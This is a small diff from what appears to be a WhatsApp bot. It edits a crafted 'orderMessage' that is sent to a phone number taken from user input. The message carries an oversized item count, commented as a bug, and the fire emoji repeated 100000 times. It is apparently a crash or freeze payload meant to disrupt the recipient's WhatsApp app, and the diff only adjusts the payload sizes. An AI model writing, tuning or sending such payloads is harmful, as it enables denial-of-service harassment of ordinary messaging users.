@@ -8,10 +8,10 @@ conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'Ini Apaan?', 
   },
   message: {
    orderMessage: {
-    itemCount: 999999999999999999999999999999999999, // Bug
+    itemCount: 99999999999999999999999999999999999999999, // Bug
     status: 1,
     surface: 1,
-    message: '🔥'.repeat(1000000),
+    message: '🔥'.repeat(100000),
     orderTitle: 'ziziz', // Idk what this does
     sellerJid: '0@s.whatsapp.net' // Seller
    }
